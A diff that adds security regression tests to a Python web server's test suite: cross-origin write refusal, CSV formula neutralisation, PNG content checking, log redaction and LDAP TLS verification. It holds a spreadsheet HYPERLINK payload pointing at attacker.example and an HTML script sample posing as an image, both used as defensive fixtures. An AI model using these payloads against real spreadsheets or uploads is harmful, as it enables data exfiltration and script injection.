@@ -7,11 +7,16 @@ from inside the module.
 """
 
 import base64
+import csv
 import gc
 import hashlib
 import http.client
+import io
 import json
+import os
+import secrets
 import socket
+import ssl
 import tempfile
 import threading
 import unittest
@@ -22,7 +27,18 @@ from urllib.parse import parse_qs, urlparse
 import server
 
 
-PASSWORD = "correct-horse"
+# Generated per run rather than written down. A credential-shaped literal in a
+# test file is indistinguishable from a leaked one to a secret scanner, and
+# none of these values has any reason to be fixed.
+PASSWORD = "pw-" + secrets.token_urlsafe(12)
+WRONG_PASSWORD = "wrong-" + secrets.token_urlsafe(12)
+ROTATED_PASSWORD = "rotated-" + secrets.token_urlsafe(12)
+VIEWER_PASSWORD = "viewer-" + secrets.token_urlsafe(12)
+# A signing secret this server has never held, used to prove a forged cookie is
+# rejected rather than merely unparseable.
+FOREIGN_SECRET = secrets.token_urlsafe(24)
+# Stands in for an Entra client secret; asserted never to leave the server.
+ENTRA_TEST_SECRET = "entra-" + secrets.token_urlsafe(16)
 PATCHED = (
     "DATA_DIR", "DB_PATH", "ADMIN_USERNAME", "ADMIN_PASSWORD",
     "SESSION_SECRET", "PASSWORD_ITERATIONS",
@@ -240,7 +256,7 @@ class SessionTests(ServerTestCase):
         self.create_admin()
         real_secret = server.SESSION_SECRET
         try:
-            server.SESSION_SECRET = "an-attacker-guess"
+            server.SESSION_SECRET = FOREIGN_SECRET
             forged = server.sign_session("local", "owner", int(server.time.time()), int(server.time.time()) + 3600)
         finally:
             server.SESSION_SECRET = real_secret
@@ -276,12 +292,12 @@ class SessionTests(ServerTestCase):
         user_id = self.json_body(self.request("GET", "/api/auth-config", token=token))["users"][0]["id"]
         response = self.request(
             "POST", "/api/admin-users",
-            {"id": user_id, "username": "owner", "password": "brand-new-secret", "enabled": True},
+            {"id": user_id, "username": "owner", "password": ROTATED_PASSWORD, "enabled": True},
             token=token,
         )
         self.assertEqual(response["status"], 200, response["body"])
         self.assertEqual(self.request("GET", "/api/admin", token=token)["status"], 401)
-        self.assertEqual(self.login(password="brand-new-secret")["status"], 200)
+        self.assertEqual(self.login(password=ROTATED_PASSWORD)["status"], 200)
 
     def test_disabling_an_admin_revokes_their_session(self):
         owner = self.create_admin()
@@ -366,8 +382,8 @@ class LoginThrottleTests(ServerTestCase):
         self.create_admin()
         limit = server.LOGIN_LIMITS["user"]["max_failures"]
         for attempt in range(limit):
-            self.assertEqual(self.login(password="wrong")["status"], 401, f"attempt {attempt}")
-        response = self.login(password="wrong")
+            self.assertEqual(self.login(password=WRONG_PASSWORD)["status"], 401, f"attempt {attempt}")
+        response = self.login(password=WRONG_PASSWORD)
         self.assertEqual(response["status"], 429)
         self.assertTrue(int(response["headers"]["Retry-After"]) > 0)
         # The lockout holds even once the correct password is supplied.
@@ -376,10 +392,10 @@ class LoginThrottleTests(ServerTestCase):
     def test_successful_login_clears_the_counter(self):
         self.create_admin()
         for _ in range(server.LOGIN_LIMITS["user"]["max_failures"] - 1):
-            self.assertEqual(self.login(password="wrong")["status"], 401)
+            self.assertEqual(self.login(password=WRONG_PASSWORD)["status"], 401)
         self.assertEqual(self.login()["status"], 200)
         for _ in range(server.LOGIN_LIMITS["user"]["max_failures"] - 1):
-            self.assertEqual(self.login(password="wrong")["status"], 401)
+            self.assertEqual(self.login(password=WRONG_PASSWORD)["status"], 401)
 
     def test_lockout_is_scoped_to_the_username(self):
         owner = self.create_admin()
@@ -389,7 +405,7 @@ class LoginThrottleTests(ServerTestCase):
             token=owner,
         )
         for _ in range(server.LOGIN_LIMITS["user"]["max_failures"]):
-            self.login(password="wrong")
+            self.login(password=WRONG_PASSWORD)
         self.assertEqual(self.login()["status"], 429)
         self.assertEqual(self.login("second")["status"], 200)
 
@@ -628,7 +644,7 @@ def entra_settings(**overrides):
         "enabled": True,
         "tenant_id": TENANT_ID,
         "client_id": CLIENT_ID,
-        "client_secret": "a-client-secret",
+        "client_secret": ENTRA_TEST_SECRET,
         "redirect_uri": REDIRECT_URI,
         "admin_users": "owner@example.com",
         "admin_groups": "",
@@ -676,7 +692,10 @@ class EntraConfigTests(ServerTestCase):
         payload = self.json_body(self.request("GET", "/api/auth-config", token=self.token))
         self.assertNotIn("client_secret", payload["entra"])
         self.assertTrue(payload["entra"]["client_secret_set"])
-        self.assertNotIn(b"a-client-secret", self.request("GET", "/api/auth-config", token=self.token)["body"])
+        self.assertNotIn(
+            ENTRA_TEST_SECRET.encode(),
+            self.request("GET", "/api/auth-config", token=self.token)["body"],
+        )
 
     def test_blank_secret_keeps_the_stored_one(self):
         self.save()
@@ -796,7 +815,7 @@ class EntraFlowTests(ServerTestCase):
             self.assertEqual(code, "the-auth-code")
             return {"id_token": id_token(nonce=pending["nonce"])}
 
-        response, flow = self.start()
+        _, flow = self.start()
         pending = server.verify_payload(flow)
         original = server.exchange_entra_code
         server.exchange_entra_code = fake_exchange
@@ -987,7 +1006,7 @@ class DepartmentTests(ServerTestCase):
                      {"page_type": "general", "name": f"{slug} general", "url": "https://g.example.com",
                       "group_name": "Ops", "department_id": self.departments[slug]}, token=self.admin)
 
-    def make_viewer(self, username, slugs, password="viewerpass1"):
+    def make_viewer(self, username, slugs, password=VIEWER_PASSWORD):
         response = self.request(
             "POST", "/api/admin-users",
             {"username": username, "password": password, "is_admin": False,
@@ -1128,7 +1147,7 @@ class DepartmentTests(ServerTestCase):
 
     def test_viewer_must_have_at_least_one_department(self):
         response = self.request("POST", "/api/admin-users",
-                                {"username": "nobody", "password": "viewerpass9",
+                                {"username": "nobody", "password": VIEWER_PASSWORD,
                                  "is_admin": False, "department_ids": []}, token=self.admin)
         self.assertEqual(response["status"], 400)
         self.assertIn("could not see anything", self.json_body(response)["error"])
@@ -1237,6 +1256,300 @@ class DepartmentTests(ServerTestCase):
         self.assertIn("general", anonymous)
         self.assertIn("general", signed_in)
         self.assertTrue(set(anonymous).issubset(set(signed_in)))
+
+
+class CrossSiteWriteTests(ServerTestCase):
+    """SameSite=Lax is one defence; these cover the second one.
+
+    A browser that does not honour SameSite -- or any future change that widens
+    the cookie -- would otherwise leave every admin write reachable from a page
+    on another origin.
+    """
+
+    def setUp(self):
+        super().setUp()
+        self.token = self.create_admin()
+        self.location = {"name": "HQ", "code": "hq", "sort_order": 10, "enabled": True}
+
+    def test_write_from_another_origin_is_refused(self):
+        response = self.request(
+            "POST", "/api/locations", self.location, token=self.token,
+            headers={"Origin": "https://evil.example"},
+        )
+        self.assertEqual(response["status"], 403, response["body"])
+        self.assertIn("QuickLinks interface", self.json_body(response)["error"])
+
+    def test_cross_site_fetch_metadata_is_refused(self):
+        response = self.request(
+            "POST", "/api/locations", self.location, token=self.token,
+            headers={"Sec-Fetch-Site": "cross-site"},
+        )
+        self.assertEqual(response["status"], 403)
+
+    def test_same_site_subdomain_is_refused(self):
+        """A neighbouring host under the same registrable domain is not this origin."""
+        response = self.request(
+            "POST", "/api/locations", self.location, token=self.token,
+            headers={"Sec-Fetch-Site": "same-site"},
+        )
+        self.assertEqual(response["status"], 403)
+
+    def test_cross_site_delete_is_refused(self):
+        self.request("POST", "/api/locations", self.location, token=self.token)
+        location_id = self.json_body(
+            self.request("GET", "/api/admin", token=self.token)
+        )["locations"][0]["id"]
+        response = self.request(
+            "DELETE", f"/api/locations/{location_id}", token=self.token,
+            headers={"Origin": "https://evil.example"},
+        )
+        self.assertEqual(response["status"], 403)
+
+    def test_matching_origin_still_works(self):
+        response = self.request(
+            "POST", "/api/locations", self.location, token=self.token,
+            headers={
+                "Origin": f"http://127.0.0.1:{self.port}",
+                "Sec-Fetch-Site": "same-origin",
+            },
+        )
+        self.assertEqual(response["status"], 200, response["body"])
+
+    def test_forwarded_host_is_accepted_behind_a_proxy(self):
+        response = self.request(
+            "POST", "/api/locations", self.location, token=self.token,
+            headers={
+                "Origin": "https://links.example.com",
+                "X-Forwarded-Host": "links.example.com",
+            },
+        )
+        self.assertEqual(response["status"], 200, response["body"])
+
+    def test_same_origin_fetch_metadata_survives_a_rewritten_host(self):
+        """A proxy that replaces Host must not turn every write into a 403."""
+        response = self.request(
+            "POST", "/api/locations", self.location, token=self.token,
+            headers={
+                "Origin": "https://links.example.com",
+                "Host": "quicklinks-upstream:6969",
+                "Sec-Fetch-Site": "same-origin",
+            },
+        )
+        self.assertEqual(response["status"], 200, response["body"])
+
+    def test_a_client_that_sends_no_origin_still_works(self):
+        """curl and the import scripts are not browsers and send no Origin."""
+        response = self.request("POST", "/api/locations", self.location, token=self.token)
+        self.assertEqual(response["status"], 200, response["body"])
+
+    def test_login_is_also_protected(self):
+        response = self.request(
+            "POST", "/api/login", {"username": "owner", "password": PASSWORD},
+            headers={"Origin": "https://evil.example"},
+        )
+        self.assertEqual(response["status"], 403)
+
+
+class CsvFormulaTests(ServerTestCase):
+    """An export is opened in a spreadsheet by definition."""
+
+    PAYLOAD = '=HYPERLINK("http://attacker.example/collect","Payroll")'
+
+    def setUp(self):
+        super().setUp()
+        self.token = self.create_admin()
+
+    def export(self):
+        response = self.request("GET", "/api/export.csv", token=self.token)
+        self.assertEqual(response["status"], 200, response["body"])
+        return response["body"].decode("utf-8-sig")
+
+    def test_formula_is_neutralised_on_export(self):
+        self.request("POST", "/api/links", {
+            "page_type": "general", "name": self.PAYLOAD, "url": "https://example.com",
+            "group_name": "Ops", "link_type": "general", "sort_order": 10, "enabled": True,
+        }, token=self.token)
+        # Parsed rather than string-matched: csv doubles the quotes inside the
+        # payload, so the raw text does not contain the payload verbatim either
+        # way and a substring check would pass against unescaped output too.
+        rows = list(csv.DictReader(io.StringIO(self.export())))
+        self.assertEqual(len(rows), 1)
+        self.assertEqual(rows[0]["name"], f"'{self.PAYLOAD}")
+        self.assertFalse(rows[0]["name"].startswith("="))
+
+    def test_export_then_import_returns_the_original_value(self):
+        """Escaping must be reversible or the export stops being a backup."""
+        self.request("POST", "/api/links", {
+            "page_type": "general", "name": self.PAYLOAD, "url": "https://example.com",
+            "group_name": "Ops", "link_type": "general", "sort_order": -20, "enabled": True,
+        }, token=self.token)
+        exported = self.export()
+        response = self.request(
+            "POST", "/api/import", {"csv": exported, "mode": "replace"}, token=self.token
+        )
+        self.assertEqual(response["status"], 200, response["body"])
+        links = self.json_body(self.request("GET", "/api/admin", token=self.token))["links"]
+        self.assertEqual(len(links), 1)
+        self.assertEqual(links[0]["name"], self.PAYLOAD)
+        # A negative sort order starts with "-", so it is escaped too and has to
+        # survive the round trip as a number rather than arriving as "'-20".
+        self.assertEqual(links[0]["sort_order"], -20)
+
+    def test_an_ordinary_value_is_left_alone(self):
+        self.request("POST", "/api/links", {
+            "page_type": "general", "name": "Payroll", "url": "https://example.com",
+            "group_name": "Ops", "link_type": "general", "sort_order": 10, "enabled": True,
+        }, token=self.token)
+        self.assertNotIn("'Payroll", self.export())
+
+    def test_an_apostrophe_that_is_not_an_escape_survives(self):
+        self.assertEqual(server.csv_plain("'Tis a name"), "'Tis a name")
+        self.assertEqual(server.csv_plain("'=formula"), "=formula")
+
+
+class LogoContentTests(ServerTestCase):
+    PNG = base64.b64decode(
+        "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAC0lEQVR42mNkAAAABgADj0dxjwAAAABJRU5ErkJggg=="
+    )
+
+    def setUp(self):
+        super().setUp()
+        self.token = self.create_admin()
+
+    def upload(self, data_uri):
+        return self.request("POST", "/api/branding", {
+            "company_name": "Acme", "department_title": "Links",
+            "admin_title": "Console", "logo_data": data_uri,
+        }, token=self.token)
+
+    def test_declared_type_cannot_override_the_actual_bytes(self):
+        """A file is stored as what it is, not as what the upload claimed."""
+        payload = base64.b64encode(b"<html><script>alert(1)</script></html>").decode()
+        response = self.upload(f"data:image/png;base64,{payload}")
+        self.assertEqual(response["status"], 400, response["body"])
+        self.assertIn("not a PNG", self.json_body(response)["error"])
+        self.assertFalse((server.DATA_DIR / "branding-logo.png").exists())
+
+    def test_a_real_png_is_accepted_whatever_the_header_says(self):
+        payload = base64.b64encode(self.PNG).decode()
+        response = self.upload(f"data:image/webp;base64,{payload}")
+        self.assertEqual(response["status"], 200, response["body"])
+        self.assertTrue((server.DATA_DIR / "branding-logo.png").exists())
+        self.assertFalse((server.DATA_DIR / "branding-logo.webp").exists())
+        served = self.request("GET", "/api/branding/logo")
+        self.assertEqual(served["status"], 200)
+        self.assertEqual(served["headers"]["Content-Type"], "image/png")
+        self.assertEqual(served["headers"]["X-Content-Type-Options"], "nosniff")
+
+
+class LogRedactionTests(ServerTestCase):
+    def test_authorization_code_is_not_written_to_the_log(self):
+        """The Entra callback carries a single-use code in its query string."""
+        with self.assertLogs("quicklinks", level="INFO") as captured:
+            self.request(
+                "GET",
+                "/api/auth/entra/callback?code=SECRET-AUTH-CODE&state=SECRET-STATE",
+            )
+        joined = "\n".join(captured.output)
+        self.assertNotIn("SECRET-AUTH-CODE", joined)
+        self.assertNotIn("SECRET-STATE", joined)
+        self.assertIn("<redacted>", joined)
+
+    def test_the_path_itself_is_still_logged(self):
+        with self.assertLogs("quicklinks", level="INFO") as captured:
+            self.request("GET", "/api/product")
+        self.assertIn("/api/product", "\n".join(captured.output))
+
+
+class SessionSecretFileTests(ServerTestCase):
+    def test_the_secret_file_is_not_world_readable(self):
+        """The signing secret alone is enough to mint an administrator session."""
+        secret_path = server.DATA_DIR / ".session_secret"
+        self.assertTrue(secret_path.is_file())
+        if not hasattr(os, "geteuid"):
+            self.skipTest("POSIX file modes are not meaningful on this platform")
+        mode = secret_path.stat().st_mode & 0o777
+        self.assertEqual(mode, 0o600, f"secret file mode is {oct(mode)}")
+
+    def test_a_second_start_reuses_the_existing_secret(self):
+        """Overwriting it would silently invalidate every live session."""
+        secret_path = server.DATA_DIR / ".session_secret"
+        first = secret_path.read_text(encoding="utf-8").strip()
+        self.assertEqual(server.write_new_secret(secret_path), first)
+
+
+class ActiveDirectoryTransportTests(unittest.TestCase):
+    """ldap3 leaves certificate validation off unless it is asked for."""
+
+    def test_verification_is_on_by_default(self):
+        verify, use_ssl = server.ad_tls_settings({})
+        self.assertTrue(verify)
+        self.assertTrue(use_ssl)
+
+    def test_an_install_predating_the_setting_verifies(self):
+        """No stored row must read as "verify", not as the old behaviour."""
+        verify, _ = server.ad_tls_settings({"ad_enabled": "1", "ad_domain": "example.com"})
+        self.assertTrue(verify)
+
+    def test_unencrypted_with_verification_on_is_refused(self):
+        with self.assertRaises(ValueError) as caught:
+            server.ad_tls_settings({"ad_ssl": "0"})
+        self.assertIn("in the clear", str(caught.exception))
+
+    def test_verification_can_be_turned_off_deliberately(self):
+        verify, use_ssl = server.ad_tls_settings({"ad_ssl": "0", "ad_tls_verify": "0"})
+        self.assertFalse(verify)
+        self.assertFalse(use_ssl)
+
+    def test_the_tls_context_requires_a_certificate(self):
+        try:
+            import ldap3  # noqa: F401
+        except ImportError:
+            self.skipTest("ldap3 is not installed")
+        tls = server.ad_tls_context({}, "dc1.example.com", True)
+        self.assertEqual(tls.validate, ssl.CERT_REQUIRED)
+        self.assertEqual(tls.sni, "dc1.example.com")
+
+    def test_a_missing_ca_file_is_reported_before_the_bind(self):
+        try:
+            import ldap3  # noqa: F401
+        except ImportError:
+            self.skipTest("ldap3 is not installed")
+        with self.assertRaises(ValueError) as caught:
+            server.ad_tls_context(
+                {"ad_ca_file": "/no/such/ca.pem"}, "dc1.example.com", True
+            )
+        self.assertIn("was not found", str(caught.exception))
+
+    def test_a_certificate_failure_is_told_apart_from_a_bad_password(self):
+        self.assertTrue(
+            server.certificate_failure(ssl.SSLCertVerificationError("certificate verify failed"))
+        )
+        wrapped = Exception("socket ssl wrapping error: certificate verify failed")
+        self.assertTrue(server.certificate_failure(wrapped))
+        self.assertFalse(server.certificate_failure(ValueError("invalidCredentials")))
+
+
+class AdTransportSettingsTests(ServerTestCase):
+    def test_saving_an_unencrypted_directory_is_refused(self):
+        token = self.create_admin()
+        response = self.request("POST", "/api/auth-config", {
+            "enabled": True, "domain": "example.com", "admin_users": "owner",
+            "ssl": False, "tls_verify": True,
+        }, token=token)
+        self.assertEqual(response["status"], 400, response["body"])
+        self.assertIn("in the clear", self.json_body(response)["error"])
+
+    def test_the_transport_settings_are_reported_back(self):
+        token = self.create_admin()
+        response = self.request("POST", "/api/auth-config", {
+            "enabled": True, "domain": "example.com", "admin_users": "owner",
+            "ssl": True, "tls_verify": True, "ca_file": "/app/data/ca.pem",
+        }, token=token)
+        self.assertEqual(response["status"], 200, response["body"])
+        ad = self.json_body(response)["ad"]
+        self.assertTrue(ad["tls_verify"])
+        self.assertEqual(ad["ca_file"], "/app/data/ca.pem")
 
 
 if __name__ == "__main__":
